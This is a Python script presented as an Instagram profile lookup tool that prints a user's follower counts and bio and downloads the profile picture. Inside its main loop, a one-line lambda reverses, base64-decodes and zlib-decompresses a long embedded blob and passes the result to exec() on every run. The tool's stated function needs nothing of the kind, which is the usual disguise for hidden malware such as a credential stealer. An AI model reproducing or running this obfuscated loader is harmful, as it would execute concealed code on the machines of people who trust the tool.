import instaloader
import os
import time
# Clearing the SCREEN
class colors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    LIGHT_GRAY = '\033[37m'
    DARK_GRAY = '\033[90m'
    LIGHT_RED = '\033[91m'
    LIGHT_GREEN = '\033[92m'
    LIGHT_YELLOW = '\033[93m'
    LIGHT_BLUE = '\033[94m'
    LIGHT_MAGENTA = '\033[95m'
    LIGHT_CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    STRIKETHROUGH = '\033[9m'
    DOUBLE_UNDERLINE = '\033[21m'
    NORMAL_COLOR = '\033[22m'
    NORMAL_INTENSITY = '\033[22m'
    RESET_UNDERLINE = '\033[24m'
    RESET_BLINK = '\033[25m'
    RESET_REVERSE = '\033[27m'
    RESET_HIDDEN = '\033[28m'
    RESET_STRIKETHROUGH = '\033[29m'
    ORANGE = '\033[38;5;214m'  # Light Orange
    PURPLE = '\033[38;5;141m'  # Light Purple
    TEAL = '\033[38;5;37m'     # Teal
    PINK = '\033[38;5;206m'    # Light Pink
    LIME = '\033[38;5;154m'    # Lime Green
    CYAN_BLUE = '\033[38;5;39m'  # Cyan Blue
    DARK_GREEN = '\033[38;5;22m'  # Dark Green
    SKY_BLUE = '\033[38;5;111m'  # Sky Blue
    DARK_ORANGE = '\033[38;5;166m'  # Dark Orange
    INDIGO = '\033[38;5;57m'   # Indigo
    GRAY = '\033[38;5;242m'   
    MAROON = '\033[38;5;52m'   
    OCEAN_BLUE = '\033[38;5;21m'  
    GOLD = '\033[38;5;220m' 


while True:
 os.system('cls' if os.name == 'nt' else 'clear')
 _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
 def fetch_profile_info(username):
     L = instaloader.Instaloader()
     profile = instaloader.Profile.from_username(L.context, username)
     print(f"{colors.SKY_BLUE}\n\nUsername: {colors.LIGHT_YELLOW}{profile.username}")
     print(f"{colors.SKY_BLUE}Post Number: {colors.LIGHT_YELLOW}{profile.mediacount}")
     print(f"{colors.SKY_BLUE}Followers: {colors.LIGHT_YELLOW}{profile.followers:,}")
     print(f"{colors.SKY_BLUE}Followings: {colors.LIGHT_YELLOW}{profile.followees:,} ")
     print(f"{colors.SKY_BLUE}Bio: {colors.LIGHT_YELLOW}{profile.biography}\n")
     # Trying to download the profile and the informations about the account on a folder with the inputed username
     try:
         L.download_profile(colors.LIGHT_GREEN ,username, profile_pic_only=True)
         print(f"{colors.LIGHT_GREEN}\n\nProfile picture of {username} downloaded successfully.")
         time.sleep(3)
     except Exception as e:
         print(f"{colors.LIGHT_RED}\n\nFailed to download profile picture: {str(e)}")
 
 # Requesting to the user to input the username of the account he want to fetch informations.
 username = input(f"{colors.LIGHT_GREEN}\n\n\n[+] Enter Instagram username: {colors.LIGHT_YELLOW}")
 fetch_profile_info(username)
